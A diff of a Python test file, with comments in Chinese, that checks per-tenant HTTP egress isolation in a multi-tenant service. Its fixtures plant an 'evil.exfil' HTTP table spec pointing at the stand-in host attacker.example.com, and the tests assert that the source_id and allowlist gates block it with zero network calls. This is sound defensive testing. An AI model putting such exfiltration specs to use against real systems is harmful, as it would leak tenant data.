@@ -1,28 +1,39 @@
-"""闸门：file catalog owner-gate 的三层门（v0.9.6 D1/D7/D8）—— **非 owner 路径唯一的覆盖**。
+"""闸门：per-tenant 隔离在 HTTP 数据面上的三处落点（v0.9.6 ① + **v0.9.7 ②③**）。
 
-## 为什么这个文件承重
-既有套件里触及 `pick_http_route` / `execute` / `run_http_step` 的 **8 个测文件全部在 tid=1（owner）下跑**
-（显式 `{1,}` 或经 `conftest` autouse `{"id": 1, …}`，实读）⇒ **owner 路径覆盖充分，非 owner 路径零覆盖**。
-本文件补的就是那一半。
+## 本文件承重的原因不变
+既有套件里触及 `pick_http_route` / `execute` / `run_http_step` 的 **8 个测文件全部在 tid=1（起源租户）
+下跑**（显式 `{1,}` 或经 `conftest` autouse `{"id": 1, …}`，实读）⇒ **起源租户路径覆盖充分，
+非起源租户路径零覆盖**。本文件补的就是那一半。
 
-## 三层，一个谓词（别把它们合并）
-| 层 | 落点 | 行为 | 被谁绕过 |
+## ⭐ v0.9.7 的语义反转（读本文件前必须先读这段）
+v0.9.6 靠**「是不是起源租户」**这一个谓词挡住三处；其中**两处是代偿控制**，随 ②③ 落地已摘：
+
+| 落点 | v0.9.6 | v0.9.7 | 谁在守 |
 |---|---|---|---|
-**硬边界** | `adapters/http/executor.execute` **内** | 非 owner → `HTTPAuthError` | **绕不过** —— 它是唯一发请求 + 唯一读进程 env 凭据的函数 |
-**软降级** | `http_planner.pick_http_route` Layer 0 | 返 `None` + 日志 → 优雅落 SQL | `run_http_step` 是**公开函数、自带 spec、不重新求 route** ⇒ 直呼即绕过 |
-**文件闸** | `catalog_loaders.load_file_layer` | 非 owner 返完整 empty 五元组 | 只管 file 层；**DB producer 由租户 admin 自助写** |
+| `catalog_loaders.load_file_layer` | 非起源租户返完整 empty 五元组 | **不变** | ① file 层只归起源租户 |
+| `http_planner.pick_http_route` Layer 0 | 非起源租户不做 HTTP 路由 | **已摘** | 改由「spec 有没有绑本租户数据源」判（②） |
+| `executor.execute` owner 门 | 非起源租户 → `HTTPAuthError` | **已摘** | 改由 ②（`source_id`）+ ③（`allowed_http_hosts`）判 |
 
-⭐ 这个分工是评审三轮才收敛的（门装错位置错了两次）：
-v1 论证在「谁 import `execute`」= **拓扑** · v2 门在 `pick_http_route` = **决策点** ·
-v3 才落到 `execute` = **能力行使处**。**门要装在能力被行使的那一行。**
+⇒ **按租户区分的不再是「是不是起源租户」，而是「凭据是不是自己的」+「主机是不是自己 allowlist 里的」。**
+路由命中、执行被 allowlist 拒 = **预期行为**（不是缺陷）；「非起源租户一律拒」才是缺陷
+（那是把功能删掉 —— 故本文件有 `test_non_owner_with_its_own_allowlist_is_allowed` 作正对照）。
 
-## ⛔ 本门是**代偿控制**，不是修复
-它代偿 R-T-GATE 清单的 **②（per-tenant `http_spec` 凭据）和 ③（egress 租户域化）**：
-- ② 只讲「无 `source_id` 的 env 路径」—— `source_id` 路径的凭据来自**租户自己的库**
-  （`resolve_spec` → `get_datasource` → `get_conn`）⇒ 那条本已 per-tenant，本门对它是**过阻**；
-- ③ **让这个过阻仍然正确**：allowlist 是**进程级** ⇒ 非 owner 即便用自己的凭据，
-  打的也是**部署方 allowlist 里的主机** = 伸手进部署方网络（SSRF 向）。
-⛔ **只有 ②③ 都落地才可移除本门**。
+## 能力处 vs 决策处（这个分工没变，是本文件的骨架）
+- **能力处** = `executor.execute`：唯一发网络请求的函数。两道**独立**硬边界 ——
+  ② 无 `source_id` → 拒；③ host 不在本租户 allowlist → 拒。**绕不过。**
+- **决策处** = `pick_http_route`：无 `source_id` → 软降级落 SQL **+ 记日志**（不记 = v0.7.29b 静默落 SQL）。
+  ⚠️ 它**可以被绕过**：`run_http_step` 是公开函数、自带 spec、不重新求 route
+  ⇒ 故两道门必须在能力处独立成立（`test_direct_run_http_step_is_refused_by_both_gates`）。
+
+⭐ 这个分工是评审三轮才收敛的（门装错位置错了两次）：v1 论证在「谁 import `execute`」= **拓扑** ·
+v2 门在 `pick_http_route` = **决策点** · v3 才落到 `execute` = **能力行使处**。
+**门要装在能力被行使的那一行。**
+
+## ⚠️ 写本文件的测时最容易踩的两个「测不到它想测的地方」
+1. **spec 必须带 `source_id`**（`_evil_tables(sid)`）：否则会被 **② 的门**拦住，
+   「③ 拦住了它」这件事根本没被验到。实测：摘门后旧版无 `source_id` 的恶意表**照绿**。
+2. **ctx 必须从真实平台库行建**（`_in_real`）：`_in()` 是手工字典、**不含平台列**
+   ⇒ `allowed_http_hosts` 永远读成「未配置」，无论你怎么 UPDATE 那一列。
 """
 from __future__ import annotations
 
@@ -33,6 +44,7 @@ import pathlib
 
 import pytest
 
+from knot.adapters.http import url_allowlist as ua_mod
 from knot.core.tenant_context import (
     OWNER_TENANT_ID,
     current_tenant,
@@ -44,16 +56,87 @@ from knot.services.agents import catalog, catalog_loaders, catalog_state
 
 _REPO = pathlib.Path(__file__).resolve().parents[1]
 
+#: 恶意 host（**任何租户的 allowlist 都不含它** —— 除了显式配上去的正对照测）
+_EVIL_HOST = "attacker.example.com"
+
 #: 恶意 http 表 + lexicon —— 租户 admin 经 `PUT /api/admin/catalog` 能写的全部东西
 #: （`api/catalog.py:69-76` 对 `tables` **只校验 `isinstance(v, list)`**，`source_type`/`http_spec` 零校验）
-_EVIL_TABLES = [{
+#:
+#: ⭐ **v0.9.7 必须带 `source_id`**（否则本文件多条测会**因为错误的原因而绿**）：
+#: commit 8 起 `pick_http_route` 对**无 `source_id`** 的 spec 一律软降级 ⇒ 不带 source_id 的恶意表
+#: 会被 **② 的门**拦住，于是「③ 的 per-tenant allowlist 拦住了它」这件事**在测里根本没被验到**。
+#: 实测坐实：摘掉 v0.9.6 owner 门后，旧版 `_EVIL_TABLES`（无 source_id）那两条测**照绿**。
+#: ⇒ 带上 source_id = 让 ② 满足、把判别力交给 ③。
+def _evil_tables(source_id: int) -> list:
+    return [{
+        "db": "evil", "table": "exfil", "columns": [],
+        "source_type": "http",
+        "http_spec": {"method": "GET", "url_template": "{base_url}/v1/all", "source_id": source_id},
+    }]
+
+
+#: 无 `source_id` 的形态 —— 专测 ②（凭据未绑本租户数据源）
+_UNBOUND_TABLES = [{
     "db": "evil", "table": "exfil", "columns": [],
     "source_type": "http",
     "http_spec": {"method": "GET", "url_template": "{base_url}/v1/all",
-                  "base_url": "https://attacker.example.com",
-                  "auth_header": "k", "auth_value": "v"},
+                  "base_url": f"https://{_EVIL_HOST}", "auth_header": "k", "auth_value": "v"},
 }]
 _EVIL_LEXICON = {"持仓": ["evil.exfil"]}
+
+
+def _plant_evil_http_source(tid: int, dbdir: str, host: str = _EVIL_HOST) -> int:
+    """在该租户库里**直接经 repo** 种一条指向 `host` 的 http 数据源，返回其 id。
+
+    ⚠️ **为什么绕过 API 写侧门**：③ 落地后 `POST/PUT /api/admin/datasources` 会对
+    「host 不在**本租户** allowlist」返 400 ⇒ 经 API 根本存不进来。
+    但**读侧的门必须独立成立**（防御纵深）：存量行、部署方直接 UPDATE、或哪天写侧门被绕，
+    执行处都必须仍然拒。⇒ 本 helper 制造的正是「库里已经有一条坏行」这个前提。
+    """
+    import json as _json
+
+    from knot.repositories import data_source_repo, user_repo
+    tok = _in(tid, dbdir)
+    try:
+        admin = user_repo.get_user_by_username("admin")
+        return data_source_repo.create_datasource(
+            (admin or {}).get("id", 1), f"evil-http-{tid}", "读侧门测试用（绕过 API 写侧门）",
+            "", 0, "", "", "", db_type="http",
+            http_config=_json.dumps({"base_url": f"https://{host}",
+                                     "auth_header": "k", "auth_value": "v"}),
+        )
+    finally:
+        reset_active_tenant(tok)
+
+
+def _observed_source_labels() -> set[str]:
+    """把 `resolve_allowed_hosts` 的**来源标签**从行为派生出来（不硬编字面）。
+
+    ⚠️ **为什么派生而不是硬编三个字面**：硬编的清单在本仓已被反复证明会漂
+    （加第四个标签时没人会想起来同步测里那份）。这里跑遍三态、收集实际返回的标签
+    ⇒ 将来加标签只要有一个状态能产生它，就自动被下面的守护覆盖。
+    ⚠️ 配一条**防空转**的前提断言（见调用点）：若派生出空集，下面的 for 循环会静默通过
+    —— 那正是「绿分不清『守住了』与『探针没到达』」。
+    """
+    seen = set()
+    for row in ({"id": 2, "db_dir": "."},                                   # 非起源 + 未配置
+                {"id": OWNER_TENANT_ID, "db_dir": "."},                      # 起源 + 未配置 → env 回退
+                {"id": 2, "db_dir": ".", ua_mod.COLUMN_NAME: "x.example.com"}):  # 已配置
+        tok = set_active_tenant(row)
+        try:
+            seen.add(ua_mod.resolve_allowed_hosts()[1])
+        finally:
+            reset_active_tenant(tok)
+    return seen
+
+
+def _set_allowlist(tid: int, value: str | None) -> None:
+    """设某租户的 `tenants.allowed_http_hosts`（部署方动作 —— 无端点，唯一途径就是直接 UPDATE）。"""
+    from knot.repositories import tenant_repo
+    conn = tenant_repo.get_platform_conn()
+    conn.execute("UPDATE tenants SET allowed_http_hosts=? WHERE id=?", (value, tid))
+    conn.commit()
+    conn.close()
 
 
 @pytest.fixture
@@ -84,25 +167,22 @@ def _in(tid: int, dbdir: str):
     return set_active_tenant({"id": tid, "db_dir": dbdir})
 
 
-@pytest.fixture
-def no_network(monkeypatch):
-    """出网探针：**先记录、再抛** —— 返回记录列表。
+def _in_real(tid: int):
+    """从**真实平台库行**建 ctx —— 生产就是这么建的（`get_tenant` → `set_active_tenant`）。
 
-    ⚠️ **为什么必须「先记录」而不是只抛**：`run_http_step` 有 `except Exception as e:` 兜底
-    ⇒ 探针抛的异常**会被吞掉**、变成一个普通的 `success=False` ⇒ 「有没有真发请求」这个事件
-    **在「返回了错误」这个 oracle 里表示不出来**。记录下来才可观察。
-    （实施期实证：初版只抛不记 ⇒ 摘掉硬边界后测**仍绿**。）
+    ⚠️ **测 `tenants.allowed_http_hosts` 必须用这个，不能用 `_in()`**（实施期实测踩到）：
+    `_in()` 建的是**手工字典** `{"id":…, "db_dir":…}`，**不含平台列** ⇒ `resolve_allowed_hosts`
+    永远走到「未配置」分支 ⇒ 无论你怎么 UPDATE 那一列，测都在验「未配置」这一种情形。
+    实测症状：日志 `allowlist 来源=unconfigured`，而我以为在验「显式配空」/「配了本 host」。
+    ⇒ 又一次「测没到达它想测的地方」。
     """
-    import requests
-    calls: list = []
+    from knot.repositories import tenant_repo
+    row = tenant_repo.get_tenant(tid)
+    assert row is not None, f"tenant#{tid} 不存在 —— fixture 没建好"
+    return set_active_tenant(row)
 
-    def _probe(url=None, *a, **k):
-        calls.append(url)
-        raise AssertionError("❌ 发生了真实网络请求 —— 硬边界失效")
 
-    monkeypatch.setattr(requests, "get", _probe)
-    monkeypatch.setattr(requests, "post", _probe)
-    return calls
+# `no_network` fixture 已于 v0.9.7 提到 `tests/conftest.py`（第二个消费者出现 ⇒ 不复制判据）。
 
 
 # ─── 谓词本身（验收 4/5/6）──────────────────────────────────────────────
@@ -213,119 +293,179 @@ def test_non_owner_reload_strict_does_not_raise(two_tenants):
 # ─── 软降级 + 硬边界（验收 7 / 7b / 8）──────────────────────────────────
 
 
-def _write_evil(tid: int, dbdir: str):
+def _write_evil(tid: int, dbdir: str, tables: list | None = None):
+    """把恶意表 + lexicon 写进该租户库的 catalog。`tables=None` → 无绑定形态（测 ②）。"""
     from knot.repositories import catalog_repo
     tok = _in(tid, dbdir)
     try:
         catalog_repo.update_catalog(
-            1, tables=json.dumps(_EVIL_TABLES, ensure_ascii=False),
+            1, tables=json.dumps(tables if tables is not None else _UNBOUND_TABLES,
+                                 ensure_ascii=False),
             lexicon=json.dumps(_EVIL_LEXICON, ensure_ascii=False))
     finally:
         reset_active_tenant(tok)
     catalog_state.invalidate_all()
 
 
-def test_malicious_db_http_table_is_not_routed_for_non_owner(two_tenants, no_network):
-    """⭐⭐ 验收 7（**符号已反向**）：非 owner 写入恶意 DB http spec + lexicon 后 `pick_http_route` **仍 None**。
+def test_malicious_db_http_table_is_refused_by_per_tenant_allowlist(two_tenants, no_network):
+    """⭐⭐ **v0.9.7 语义反转**：恶意 DB http 表现在**会被路由**（② 满足），由 **③ 的 per-tenant
+    allowlist** 在执行处拒 + **零出网**。
 
-    ⚠️ **本测的符号是评审纠正过的**：草案原写「**应命中**」——那是**把绕过固化成绿色回归不变量**。
-    绕过链（Codex R1，四环逐字坐实）：`PUT` 对 `tables` 只校验 `isinstance(v, list)` →
-    `catalog_loaders` 对**显式** `source_type` 一律保留 → DB 表入槽 → `pick_http_route` 命中。
-    **攻击者连 lexicon 都是同一个 PUT 写的 ⇒ 零猜测、全自助。**
-    取材=revert：摘掉 `pick_http_route` 的 Layer 0 → 本测红（命中 `evil.exfil`）。
+    ## 反转前后
+    v0.9.6：`pick_http_route` 的 **Layer 0**「非起源租户不做 HTTP 路由」把它挡在路由阶段
+    ⇒ 本测原名 `..._is_not_routed_for_non_owner`。
+    v0.9.7 摘掉 Layer 0（它是 ②③ 未落地期间的代偿控制）⇒ **按租户区分的不再是「是不是起源租户」，
+    而是「凭据是不是自己的」（②）+「主机是不是自己 allowlist 里的」（③）**。
+    ⇒ 路由**应当**命中（这是功能，不是缺陷），拒绝**应当**发生在能力处。
+
+    ## ⚠️ `source_id` 是本测判别力的前提（实施期实测）
+    旧 `_EVIL_TABLES` **无 `source_id`** ⇒ 会被 **② 的门**软降级 ⇒ 摘掉 v0.9.6 门后本测**照绿**，
+    但绿的理由是「② 拦的」而非「③ 拦的」⇒ **③ 在测里根本没被验到**。
+    ⇒ 现在给它绑一条**本租户的** http 数据源（`source_id`），让 ② 满足、把判别力交给 ③。
+    取材=revert：把 `check_url_allowed(url)` 从 `execute` 里摘掉 → 出网探针炸 ⇒ 本测红。
     """
     from knot.services import http_planner
-    _write_evil(2, "tenants/2")
-    tok = _in(2, "tenants/2")
+    sid = _plant_evil_http_source(2, "tenants/2")     # 库里已有一条坏行（绕过 API 写侧门）
+    _set_allowlist(2, "")                             # 本租户 allowlist 显式为空 ⇒ 全拒绝
+    _write_evil(2, "tenants/2", tables=_evil_tables(sid))
+    tok = _in_real(2)                                 # ⇐ 必须真实行，否则读不到该列
     try:
         catalog.reload(strict=False)
         assert catalog.is_http_table("evil.exfil"), "前提：恶意表确实进了槽（否则本测在验一个不存在的问题）"
-        assert http_planner.pick_http_route("看下持仓", intent="detail") is None, (
-            "非 owner 的恶意 DB http 表被路由命中 —— 软降级失效")
+        route = http_planner.pick_http_route("看下持仓", intent="detail")
+        assert route is not None, (
+            "恶意表**未被路由** —— 那么本测就没验到 ③（拦它的是别的门）。\n"
+            "v0.9.7 起路由命中是**预期**：② 已满足（spec 绑了本租户数据源）⇒ 拒绝该发生在执行处。")
+        r = asyncio.run(http_planner.run_http_step("q", "evil.exfil", route[1]))
     finally:
         reset_active_tenant(tok)
 
+    assert r["success"] is False, f"③ 失效：恶意主机的调用成功了：{r}"
+    assert "不在本租户的出网白名单内" in r["error"], (
+        f"不是 **③ 的 allowlist** 拦下的（可能是 ② 或别的关卡）：{r['error']!r}\n"
+        "⇒ 断言用 allowlist 的**专属消息**而非 `error_kind` —— 两道门都抛 `HTTPAuthError`，"
+        "`error_kind == 'http_auth'` 这个 oracle 分不清它们（v0.9.6 同款教训）。")
+    assert no_network == [], f"③ 失效：真发出了请求 {no_network}"
 
-def test_hard_boundary_blocks_direct_run_http_step(two_tenants, no_network):
-    """⭐⭐⭐ 验收 7b：**绕过 `pick_http_route`、直呼 `run_http_step`** → `execute` 内被拒 + **零网络请求**。
 
-    这是本文件判别力最高的一条：它复现的正是**软降级挡不住的那条路**——
+@pytest.mark.parametrize("case", ["unbound", "not_allowlisted"])
+def test_direct_run_http_step_is_refused_by_both_gates(case, two_tenants, no_network):
+    """⭐⭐⭐ **绕过 `pick_http_route`、直呼 `run_http_step`** → 仍被拒 + **零出网**（两道门各一格）。
+
+    这是本文件判别力最高的一条：它复现的正是**决策处挡不住的那条路** ——
     `run_http_step(refined_question, table_full_name, http_spec)` 是**公开函数、自带 spec、
-    内部不重新求 route**（零 `pick_http_route` / `is_http_table`）；`api/query.py` 里
-    `pick_http_route`（`:292`）与 `run_http_step`（`:332`）是**两次独立调用**、中间只隔一个 `if`。
-    ⇒ monitor / 定时报表 / LogicForm 混合路由 / re-run 任一条接进来，只要拿到一个 spec 就能绕过软降级。
-    ⭐ **实施期这条在软降级尚缺席时就通过了** —— 那正是「硬边界不依赖 `query.py` 那个 `if`」的证明。
-    取材=revert：摘掉 `execute` 内的门 → `no_network` 探针炸（真发请求）→ 本测红。
+    内部不重新求 route**；`api/query.py` 里 `pick_http_route`（`:292`）与 `run_http_step`（`:332`）
+    是**两次独立调用**、中间只隔一个 `if` ⇒ monitor / 定时报表 / 混合路由 / re-run 任一条接进来，
+    只要拿到一个 spec 就能绕过决策处。**故两道门都必须在能力处独立成立。**
+
+    - `unbound`：spec **无 `source_id`** ⇒ **②** 拒（凭据未绑本租户数据源）
+    - `not_allowlisted`：spec 绑了本租户数据源，但其 host 不在本租户 allowlist ⇒ **③** 拒
+
+    ⚠️ 每格断言**该门的专属消息**（不是 `error_kind`）—— 两道门都抛 `HTTPAuthError`
+    ⇒ `error_kind` 分不清是哪道拦的，摘掉一道另一道会替它「顶班」而测仍绿（v0.9.6 实证的同款陷阱）。
+    取材=revert：摘 base_url 硬边界 → `unbound` 格红；摘 `check_url_allowed` → `not_allowlisted` 格红。
     """
     from knot.services import http_planner
-    tok = _in(2, "tenants/2")
+    if case == "unbound":
+        spec, expect = _UNBOUND_TABLES[0]["http_spec"], "未绑定本租户的数据源"
+    else:
+        sid = _plant_evil_http_source(2, "tenants/2")
+        _set_allowlist(2, "")
+        spec, expect = _evil_tables(sid)[0]["http_spec"], "不在本租户的出网白名单内"
+
+    tok = _in_real(2)                                 # ⇐ 必须真实行（allowlist 列在里面）
     try:
-        r = asyncio.run(http_planner.run_http_step("q", "evil.exfil", _EVIL_TABLES[0]["http_spec"]))
-    finally:
-        reset_active_tenant(tok)
-    assert r["success"] is False
-    # ⭐ 断言门的**专属消息**，不是 `error_kind` —— 实施期实证：后续的 allowlist 关卡**也抛
-    # `HTTPAuthError`** ⇒ `error_kind == "http_auth"` 这个 oracle **分不清「门拦的」与「allowlist 拦的」**
-    # ⇒ 摘掉硬边界后测仍绿。（同一把尺子：oracle 要能表示你要排除的那个事件。）
-    assert "未启用 HTTP 数据源" in r["error"], (
-        f"不是**门**拦下的（可能是后续关卡）：{r['error']!r} —— 硬边界可能已失效")
-    # ⭐ 且**零网络请求**（探针先记录再抛 ⇒ 即便异常被吞，这个事件仍可观察）
-    assert no_network == [], f"硬边界失效：真发出了请求 {no_network}"
-
-
-def test_owner_passes_the_hard_boundary(two_tenants, no_network):
-    """**正对照**：owner 过门后走到**后续**关卡（allowlist），而不是被门拦住。
-
-    没有这一条，硬边界可以靠「拦住所有人」通过 —— 那是把功能删掉。
-    ⚠️ 断言用「**不是门的消息**」而非具体后续错误 —— 后续关卡的措辞不属本片契约。
-    """
-    from knot.services import http_planner
-    tok = _in(1, "tenants/1")
-    try:
-        r = asyncio.run(http_planner.run_http_step("q", "evil.exfil", _EVIL_TABLES[0]["http_spec"]))
-        assert r["success"] is False           # allowlist 未配 → 仍失败，但**不是门拦的**
-        assert "未启用 HTTP 数据源" not in r["error"], (
-            f"owner 被门拦住了（过阻）：{r['error']!r}")
+        r = asyncio.run(http_planner.run_http_step("q", "evil.exfil", spec))
     finally:
         reset_active_tenant(tok)
 
+    assert r["success"] is False, f"[{case}] 直呼 run_http_step 竟然成功了：{r}"
+    assert expect in r["error"], (
+        f"[{case}] 不是预期那道门拦的：{r['error']!r}（期望消息含 {expect!r}）")
+    assert no_network == [], f"[{case}] 门失效：真发出了请求 {no_network}"
 
-def test_soft_degradation_logs(two_tenants, monkeypatch):
-    """验收 8：软降级**必须记日志** —— 否则非 owner 的 http 表被拒 = **静默落 SQL**（v0.7.29b 形状）。
 
-    取材=injection：删掉那行 `logger.info` → 本测红。
+def test_non_owner_with_its_own_allowlist_is_allowed(two_tenants, no_network):
+    """⭐⭐ **正对照（must #2）**：非起源租户把 host 配进**自己的** allowlist ⇒ 请求**真的发出**。
+
+    没有这一条，②③ 可以靠「拦住所有非起源租户」通过 —— 那不是隔离，是**把功能删掉**
+    （而 v0.9.6 的门正是那样，它是代偿控制、本片已摘）。
+    ⚠️ oracle = **出网探针记录非空**（不是返回值）：探针「先记录、再抛」，其 AssertionError 会被
+    `run_http_step` 的 `except Exception` 吞成普通失败 ⇒ 「有没有真发请求」在返回值里表示不出来。
+    取材=revert：把 `resolve_allowed_hosts` 的 column 分支改成恒返 `set()` → 本测红（不再出网）。
     """
     from knot.services import http_planner
-    seen = []
-    monkeypatch.setattr(http_planner.logger, "info", lambda m, *a, **k: seen.append(str(m)))
-    _write_evil(2, "tenants/2")
-    tok = _in(2, "tenants/2")
+    sid = _plant_evil_http_source(2, "tenants/2")
+    _set_allowlist(2, _EVIL_HOST)                     # ⇐ 部署方给这个租户开了这台主机
+    tok = _in_real(2)                                 # ⇐ 必须真实行，否则该列读不到
     try:
-        http_planner.pick_http_route("看下持仓", intent="detail")
+        asyncio.run(http_planner.run_http_step("q", "evil.exfil", _evil_tables(sid)[0]["http_spec"]))
     finally:
         reset_active_tenant(tok)
-    hit = [m for m in seen if "非起源租户" in m]
-    assert hit, f"软降级未记日志（会静默落 SQL）；实际日志：{seen}"
-    assert "tenant=2" in hit[0], f"日志须点名是哪个租户被拒：{hit[0]!r}"
+    assert no_network, (
+        "非起源租户即便把 host 配进**自己的** allowlist 也没能发出请求 ——\n"
+        "⇒ 门变成了「非起源租户一律拒」= 把功能删掉，而不是「按租户判断」。\n"
+        "（v0.9.6 的 owner 门就是那个形态；它是代偿控制，v0.9.7 已摘。）"
+    )
+    assert any(_EVIL_HOST in (u or "") for u in no_network), (
+        f"发出的请求不是打向配置的 host：{no_network}")
 
 
-def test_gate_message_leaks_nothing(two_tenants, no_network):
-    """⭐ 验收 8d：门的消息**不含** env 名 / owner tid / 部署方表名 —— #262 那条缝。
+# ⛔ `test_soft_degradation_logs` 已于 v0.9.7 退役 —— 它测的是 v0.9.6 Layer 0 的日志，
+#    而 Layer 0 本身已随门一并摘除。**v0.7.29b 的教训（软降级必须记日志，否则静默落 SQL）没有丢**，
+#    它转瞄了本片**新的**软降级点（spec 无 `source_id` → 落 SQL），守护在
+#    `tests/adapters/test_http_spec_requires_source_id.py::test_pick_http_route_soft_degrades_without_source_id`
+#    与 `::test_soft_degradation_log_does_not_leak_spec_values`（后者还多守了「日志只报键名不报值」）。
 
+
+def test_egress_refusal_message_leaks_nothing(two_tenants, no_network):
+    """⭐ **v0.9.7 转瞄**：出网拒绝消息不含 env 名 / 部署方表名 / **别的租户配置的 host** —— #262 那条缝。
+
+    ## 转瞄前后
+    v0.9.6 守的是 **owner 门**的消息；门已随 ②③ 落地摘除 ⇒ 现在**真实存在**的客户端可见消息是
+    **③ 的 allowlist 拒绝**（`url_allowlist.check_url_allowed`）。同一条 #262 缝、新的落点。
     `run_http_step` 把 `str(e)` 放进 `result["error"]`，`api/query.py` **原样 yield 给客户端**
-    （#262 的教训原文就在 `executor.py` 的注释里）；且前端对 `error_kind` 是通用渲染
-    ⇒ **门写的消息就是用户看到的**。
-    取材=revert：把门消息改成含 env 名/tid 的版本 → 本测红。
+    ⇒ **这条消息就是用户看到的**。
+
+    ## ⚠️ 判据是**内容级**，且刻意不照搬旧断言
+    - 旧版断「消息不含数字」（防 tid 泄漏）—— **不能照搬**：新消息含**调用方自己给的 host**，
+      而 host 合法含数字（`api2.example.com`）⇒ 会误伤。
+    - 改断「**另一个租户配置的 host** 不出现」：这才是本片新引入的泄漏面
+      （若消息枚举 allowlist，租户 A 就能读出租户 B / 部署方的主机清单）。
+    取材=revert：把消息改回含 `(allowed: {sorted(...)})` → 本测红（那份清单里就有别人的 host）。
     """
     from knot.services import http_planner
-    tok = _in(2, "tenants/2")
+    other_tenant_host = "tenant1-private-api.corp.local"
+    _set_allowlist(1, other_tenant_host)              # 起源租户配了一台**自己的**主机
+    sid = _plant_evil_http_source(2, "tenants/2")
+    _set_allowlist(2, "")                             # 租户#2 显式全拒绝
+    tok = _in_real(2)
     try:
-        msg = asyncio.run(http_planner.run_http_step("q", "evil.exfil", _EVIL_TABLES[0]["http_spec"]))["error"]
+        msg = asyncio.run(
+            http_planner.run_http_step("q", "evil.exfil", _evil_tables(sid)[0]["http_spec"]))["error"]
     finally:
         reset_active_tenant(tok)
+
+    assert other_tenant_host not in msg, (
+        f"拒绝消息泄漏了**别的租户**配置的 host（{other_tenant_host!r}）：{msg!r}\n"
+        "⇒ 消息在枚举 allowlist。per-tenant 化后这等于把跨租户/部署方的主机清单吐给调用方。")
     for bad in ("KNOT_", "JWT_SECRET", "MASTER_KEY", "_local_catalog", "OWNER_TENANT_ID"):
-        assert bad not in msg, f"门消息泄漏 {bad!r}：{msg!r}"
-    assert not any(ch.isdigit() for ch in msg), f"门消息含数字（可能是 tid）：{msg!r}"
+        assert bad not in msg, f"拒绝消息泄漏 {bad!r}：{msg!r}"
+
+    # ⭐ should-fix（守护者 Stage 4 §III）：**来源标签不得进客户端消息**。
+    # 标签本身不是 env 值（故躲过 #262 的 AST 哨兵），但 `env-fallback` 会告诉租户
+    # 「部署方还没迁移到 per-tenant 列」—— 那是部署方的内部状态，不是租户该知道的。
+    # 原先这条只是 `resolve_allowed_hosts` docstring 里的**散文规则、零守护** ——
+    # 正是本弧反复证明挡不住漂移的形状（守护者原话）。
+    labels = _observed_source_labels()
+    assert labels >= {"column", "env-fallback", "unconfigured"}, (
+        f"来源标签派生出 {sorted(labels)} —— 三态没有全被观察到 ⇒ 下面的守护会**空转**。\n"
+        "（这条前提断言的存在本身就是判据：派生型 oracle 必须先证明它不是空的。）")
+    for label in labels:
+        assert label not in msg, (
+            f"客户端可见消息含来源标签 {label!r}：{msg!r}\n"
+            "⇒ 标签只该进日志。`env-fallback` 会把「部署方尚未迁移」这个内部状态告诉租户。")
+    assert no_network == [], f"③ 失效：真发出了请求 {no_network}"
 
 
 # ─── 结构哨兵（验收 7c / 8b / 8e）───────────────────────────────────────
@@ -337,10 +477,11 @@ def test_three_consumers_share_one_predicate():
     多份**判断**才是 N 份清单病；多个**执行点**共用一个判断是正确形状。
     取材=injection：在任一消费点改成本地重写判定（如 `current_tenant()["id"] == 1`）→ 本测红。
     """
+    # v0.9.7：消费者集随门的移除而变（实测 grep 全仓 = 恰这两处）。
+    # `pick_http_route` 的 Layer 0 与 `execute` 的 owner 门都是 ②③ 未落地期间的**代偿控制**，已摘。
     consumers = {
-        "knot/services/agents/catalog_loaders.py": "load_file_layer",
-        "knot/services/http_planner.py": "pick_http_route",
-        "knot/adapters/http/executor.py": "execute",
+        "knot/services/agents/catalog_loaders.py": "load_file_layer",       # ① file 层归起源租户
+        "knot/adapters/http/url_allowlist.py": "resolve_allowed_hosts",     # ③ 起源租户回退 env
     }
     for rel, fn_name in consumers.items():
         tree = ast.parse((_REPO / rel).read_text(encoding="utf-8"))
@@ -410,8 +551,8 @@ def test_no_second_http_client_in_http_adapter():
 # ─── 耦合 tripwire（验收 8c · 行为级）──────────────────────────────────
 
 
-def test_coupling_gate_exists_implies_rtgate_not_lifted(two_tenants):
-    """⭐⭐ 验收 8c：**门存在 ⇒ R-T-GATE 未 lift**（**行为级**断言，不是存在性）。
+def test_rtgate_still_locks_second_tenant(two_tenants):
+    """⭐⭐ **R-T-GATE 仍硬锁第二 active 租户**（**行为级**断言，不是存在性）。
 
     ⚠️ **为什么必须行为级**：断言「`assert_no_second_active_tenant_served` 那一行还在」只能抓**删除**，
     抓不住这四种「**事实上 lift 了而行还在**」：`if False:` 包起来 · 本体改 no-op ·
@@ -419,10 +560,14 @@ def test_coupling_gate_exists_implies_rtgate_not_lifted(two_tenants):
     ⇒ 这里断言的是**后果**：两个 active 租户时请求**仍 fail-closed**。
     **你要排除的事件是「R-T-GATE 事实上不再生效」，不是「那一行不见了」。**
 
-    为什么这条测挂在本片：本门是**代偿控制**；若有人 lift 了 R-T-GATE 而 ②③ 未落地，
-    非 owner 就会被真实服务，而门只是把它们的 HTTP 关掉 —— **凭据与 egress 仍是部署方那套**。
-    ⇒ lift 必须撞一条**点名本门**的红测。
-    取材=injection：注释掉 `resolve_for_request` 里那行 gate（或上述四种中和手法任一）→ 本测红。
+    ## ⚠️ v0.9.7：本测**不是**因为摘门而失效 —— 它的**理由**换了，断言没换
+    v0.9.6 时它的标题是「门存在 ⇒ R-T-GATE 未 lift」，理由是「门是代偿控制，lift 必须撞一条点名它的红测」。
+    ②③ 落地、门已摘 ⇒ 那个理由过期了。但**断言本身仍然必要**：R-T-GATE 距离可以 lift 还差
+    一串 blocker（见下方消息）⇒ 谁去 lift 都该撞上一条**告诉他还差什么**的红测。
+    ⚠️ 实测坐实它「摘门后**不会红、会静默变绿而理由变假**」—— 因为它的断言是**纯行为级**、
+    代码里根本不引用那道门（门只活在 `pytest.fail` 的消息和 docstring 里）。
+    ⇒ **这类测最危险的失效形态不是转红，是「继续绿着，但守的已经不是原来那件事」。**
+    取材=injection：注释掉 `resolve_for_request` 里那行 gate（或下述四种中和手法任一）→ 本测红。
     """
     from knot.api import tenant_resolution as tr
     from knot.core.tenant_context import TenantContextError
@@ -445,11 +590,17 @@ def test_coupling_gate_exists_implies_rtgate_not_lifted(two_tenants):
     else:
         pytest.fail(
             "两个 active 租户时请求**未** fail-closed —— **R-T-GATE 事实上已不生效**。\n"
-            "⚠️ 而 v0.9.6 的 owner 门（`adapters/http/executor.execute` 内）是**代偿控制**：\n"
-            "   它只关掉非 owner 的 **HTTP 出网**，而 **② per-tenant `http_spec` 凭据** 与\n"
-            "   **③ egress 租户域化** 仍是**部署方那一套** ⇒ **lift 前必须先落地 ②③**。\n"
